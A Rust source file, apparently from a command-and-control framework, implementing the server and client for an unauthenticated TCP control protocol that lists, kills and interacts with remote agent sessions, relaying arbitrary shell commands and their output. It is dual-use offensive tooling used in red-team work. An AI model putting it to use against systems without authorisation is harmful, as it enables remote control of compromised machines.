//! C2 Control Socket — allows the console to interact with the C2 server.
//!
//! Protocol (text-based over TCP):
//!
//! Console → C2:  LIST_SESSIONS\n
//! C2 → Console:  OK\n<json>\nEND\n
//!
//! Console → C2:  INTERACT_START <session_id>\n
//! C2 → Console:  OK\nInteracting\nEND\n
//! Console → C2:  CMD <command>\n
//! C2 → Console:  OUTPUT\n<base64_stdout>\n<base64_stderr>\n<exit_code>\nEND\n
//! Console → C2:  INTERACT_END\n
//! (connection closes after interact)

use std::sync::Arc;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpListener;
use tracing::{info, warn};

use crate::session::{SessionCommand, SessionManager};

/// Decodes base64 to bytes (simple version, no external dep).
pub fn base64_decode(input: &str) -> Vec<u8> {
    let table = |b: u8| -> u8 {
        match b {
            b'A'..=b'Z' => b - b'A',
            b'a'..=b'z' => b - b'a' + 26,
            b'0'..=b'9' => b - b'0' + 52,
            b'+' => 62,
            b'/' => 63,
            _ => 0,
        }
    };

    let bytes: Vec<u8> = input
        .bytes()
        .filter(|&b| b != b'\n' && b != b'\r' && b != b' ')
        .collect();
    let mut result = Vec::with_capacity(bytes.len() * 3 / 4);

    let chunks = bytes.chunks_exact(4);
    let remainder = chunks.remainder();

    for chunk in chunks {
        let n = ((table(chunk[0]) as u32) << 18)
            | ((table(chunk[1]) as u32) << 12)
            | ((table(chunk[2]) as u32) << 6)
            | (table(chunk[3]) as u32);
        result.push((n >> 16) as u8);
        result.push(((n >> 8) & 0xFF) as u8);
        result.push((n & 0xFF) as u8);
    }

    if remainder.len() >= 2 {
        let n = ((table(remainder[0]) as u32) << 18) | ((table(remainder[1]) as u32) << 12);
        result.push((n >> 16) as u8);
        if remainder.len() >= 3 && remainder[2] != b'=' {
            result.push(((n >> 8) & 0xFF) as u8);
        }
    }

    result
}

/// Start the C2 control server on the given address.
pub async fn start_control_server(
    listen_addr: &str,
    listen_port: u16,
    sessions: Arc<SessionManager>,
) -> anyhow::Result<()> {
    let addr = format!("{}:{}", listen_addr, listen_port);
    let listener = TcpListener::bind(&addr).await?;
    info!("C2 control server listening on {}", addr);

    loop {
        let (socket, peer) = listener.accept().await?;
        info!("Control connection from {}", peer);
        let sessions = Arc::clone(&sessions);
        tokio::spawn(handle_control_connection(socket, sessions));
    }
}

async fn handle_control_connection(socket: tokio::net::TcpStream, sessions: Arc<SessionManager>) {
    let (read_half, mut write_half) = socket.into_split();
    let mut reader = BufReader::new(read_half);
    let mut line = String::new();

    loop {
        line.clear();
        match reader.read_line(&mut line).await {
            Ok(0) => break,
            Ok(_) => {}
            Err(e) => {
                info!("Control connection closed: {}", e);
                break;
            }
        }

        let trimmed = line.trim().to_string();
        if trimmed.is_empty() {
            continue;
        }

        let parts: Vec<&str> = trimmed.splitn(2, ' ').collect();
        let cmd = parts[0];
        let args = parts.get(1).copied().unwrap_or("");

        match cmd {
            "LIST_SESSIONS" => {
                let sessions_list = sessions.list_sessions().await;
                let json =
                    serde_json::to_string(&sessions_list).unwrap_or_else(|_| "[]".to_string());
                let response = format!("OK\n{}\nEND\n", json);
                let _ = write_half.write_all(response.as_bytes()).await;
                let _ = write_half.flush().await;
            }

            "SESSION_INFO" => {
                if let Ok(id) = args.parse::<u32>() {
                    if let Some(session) = sessions.get_session(id).await {
                        let json = serde_json::to_string(&session).unwrap_or_default();
                        let response = format!("OK\n{}\nEND\n", json);
                        let _ = write_half.write_all(response.as_bytes()).await;
                    } else {
                        let _ = write_half.write_all(b"ERR\nSession not found\nEND\n").await;
                    }
                } else {
                    let _ = write_half
                        .write_all(b"ERR\nInvalid session ID\nEND\n")
                        .await;
                }
                let _ = write_half.flush().await;
            }

            "KILL_SESSION" => {
                if let Ok(id) = args.parse::<u32>() {
                    sessions.kill_session(id).await;
                    let _ = write_half.write_all(b"OK\nSession killed\nEND\n").await;
                } else {
                    let _ = write_half
                        .write_all(b"ERR\nInvalid session ID\nEND\n")
                        .await;
                }
                let _ = write_half.flush().await;
            }

            "INTERACT_START" => {
                if let Ok(session_id) = args.parse::<u32>() {
                    if sessions.get_session(session_id).await.is_none() {
                        let _ = write_half.write_all(b"ERR\nSession not found\nEND\n").await;
                        let _ = write_half.flush().await;
                        break;
                    }

                    let _ = write_half
                        .write_all(b"OK\nInteracting with session\nEND\n")
                        .await;
                    let _ = write_half.flush().await;

                    // Subscribe to session output
                    let mut output_rx = sessions.subscribe_output(session_id).await;

                    // Interact loop: read commands from console, relay agent output
                    let mut interact_line = String::new();
                    loop {
                        tokio::select! {
                            // Read command from console
                            result = reader.read_line(&mut interact_line) => {
                                match result {
                                    Ok(0) => break,
                                    Ok(_) => {
                                        let cmd_line = interact_line.trim().to_string();
                                        interact_line.clear();

                                        if cmd_line == "INTERACT_END" || cmd_line == "exit" || cmd_line == "quit" {
                                            break;
                                        }

                                        if let Some(command) = cmd_line.strip_prefix("CMD ") {
                                            let command = command.to_string();
                                            if let Some(session) = sessions.get_session(session_id).await
                                                && let Some(tx) = &session.command_tx {
                                                let _ = tx.send(SessionCommand::Execute(command)).await;
                                            }
                                        }
                                    }
                                    Err(e) => {
                                        warn!("Interact read error: {}", e);
                                        break;
                                    }
                                }
                            }

                            // Receive output from session and send to console
                            Some(output) = output_rx.recv() => {
                                let msg = format!("OUTPUT\n{}\nEND\n", output);
                                if write_half.write_all(msg.as_bytes()).await.is_err() {
                                    break;
                                }
                                if write_half.flush().await.is_err() {
                                    break;
                                }
                            }
                        }
                    }

                    sessions.unsubscribe_output(session_id).await;
                    break; // Close connection after interact
                } else {
                    let _ = write_half
                        .write_all(b"ERR\nInvalid session ID\nEND\n")
                        .await;
                    let _ = write_half.flush().await;
                }
            }

            "PING" => {
                let _ = write_half.write_all(b"OK\nPONG\nEND\n").await;
                let _ = write_half.flush().await;
            }

            _ => {
                let _ = write_half.write_all(b"ERR\nUnknown command. Use: LIST_SESSIONS, SESSION_INFO, KILL_SESSION, INTERACT_START, PING\nEND\n").await;
                let _ = write_half.flush().await;
            }
        }
    }
}

// ── Control Client (for console to connect to C2 server) ──────────────────────

/// Client for connecting to the C2 control server.
#[derive(Clone)]
pub struct C2ControlClient {
    addr: String,
}

impl C2ControlClient {
    /// Connect to a C2 control server.
    pub fn new(host: &str, port: u16) -> Self {
        Self {
            addr: format!("{}:{}", host, port),
        }
    }

    /// List active sessions on the C2 server.
    pub async fn list_sessions(&self) -> anyhow::Result<Vec<crate::session::Session>> {
        let mut stream = tokio::net::TcpStream::connect(&self.addr).await?;
        stream.write_all(b"LIST_SESSIONS\n").await?;
        stream.flush().await?;

        let mut reader = BufReader::new(stream);
        let mut status = String::new();
        reader.read_line(&mut status).await?;
        let status = status.trim().to_string();
        if status != "OK" {
            anyhow::bail!("C2 server error: {}", status);
        }

        let mut json = String::new();
        reader.read_line(&mut json).await?;
        let mut _end = String::new();
        reader.read_line(&mut _end).await?;

        // SECURITY: Validate JSON size before deserialization to prevent DoS
        let json = json.trim().to_string();
        if json.len() > 1024 * 1024 {
            anyhow::bail!(
                "Session data too large ({} bytes), possible DoS attempt",
                json.len()
            );
        }

        // Parse as generic Value first to validate structure
        let value: serde_json::Value = serde_json::from_str(&json)
            .map_err(|e| anyhow::anyhow!("Invalid JSON from C2 server: {}", e))?;

        // Ensure it's an array
        if !value.is_array() {
            anyhow::bail!("Expected session array, got: {}", value);
        }

        let sessions: Vec<crate::session::Session> = serde_json::from_value(value)
            .map_err(|e| anyhow::anyhow!("Invalid session data from C2 server: {}", e))?;
        Ok(sessions)
    }

    /// Kill a session on the C2 server.
    pub async fn kill_session(&self, session_id: u32) -> anyhow::Result<String> {
        let mut stream = tokio::net::TcpStream::connect(&self.addr).await?;
        stream
            .write_all(format!("KILL_SESSION {}\n", session_id).as_bytes())
            .await?;
        stream.flush().await?;

        let mut reader = BufReader::new(stream);
        let mut status = String::new();
        reader.read_line(&mut status).await?;
        let status = status.trim().to_string();
        if status != "OK" {
            anyhow::bail!("C2 server error: {}", status);
        }

        let mut msg = String::new();
        reader.read_line(&mut msg).await?;
        let mut _end = String::new();
        reader.read_line(&mut _end).await?;
        Ok(msg.trim().to_string())
    }

    /// Interact with a session — sends commands and receives output.
    /// Returns a tuple of (command_sender, output_receiver).
    pub async fn interact(
        &self,
        session_id: u32,
    ) -> anyhow::Result<(
        tokio::sync::mpsc::Sender<String>,   // send commands
        tokio::sync::mpsc::Receiver<String>, // receive output
    )> {
        let stream = tokio::net::TcpStream::connect(&self.addr).await?;
        let (read_half, mut write_half) = stream.into_split();

        // Send INTERACT_START
        write_half
            .write_all(format!("INTERACT_START {}\n", session_id).as_bytes())
            .await?;
        write_half.flush().await?;

        let mut buf_reader = BufReader::new(read_half);
        let mut status = String::new();
        buf_reader.read_line(&mut status).await?;
        let status = status.trim().to_string();
        if status != "OK" {
            anyhow::bail!("C2 server error: {}", status);
        }
        let mut _end = String::new();
        buf_reader.read_line(&mut _end).await?;

        // Create channels for bidirectional communication
        let (cmd_tx, mut cmd_rx) = tokio::sync::mpsc::channel::<String>(32);
        let (output_tx, output_rx) = tokio::sync::mpsc::channel::<String>(256);

        // Spawn task to read output from C2
        tokio::spawn(async move {
            let mut line = String::new();
            loop {
                line.clear();
                match buf_reader.read_line(&mut line).await {
                    Ok(0) => break,
                    Ok(_) => {
                        let trimmed = line.trim().to_string();
                        if trimmed == "OUTPUT" {
                            // Read the output block until END
                            let mut output_lines = Vec::new();
                            loop {
                                let mut l = String::new();
                                match buf_reader.read_line(&mut l).await {
                                    Ok(0) => break,
                                    Ok(_) => {
                                        let t = l.trim().to_string();
                                        if t == "END" {
                                            break;
                                        }
                                        output_lines.push(t);
                                    }
                                    Err(_) => break,
                                }
                            }
                            let output = output_lines.join("\n");
                            let _ = output_tx.send(output).await;
                        } else if trimmed == "ERR" {
                            let mut msg = String::new();
                            let _ = buf_reader.read_line(&mut msg).await;
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        // Spawn task to send commands to C2
        tokio::spawn(async move {
            while let Some(cmd) = cmd_rx.recv().await {
                let msg = if cmd == "INTERACT_END" || cmd == "exit" || cmd == "quit" {
                    format!("{}\n", cmd)
                } else {
                    format!("CMD {}\n", cmd)
                };
                if write_half.write_all(msg.as_bytes()).await.is_err() {
                    break;
                }
                if write_half.flush().await.is_err() {
                    break;
                }
            }
        });

        Ok((cmd_tx, output_rx))
    }
}
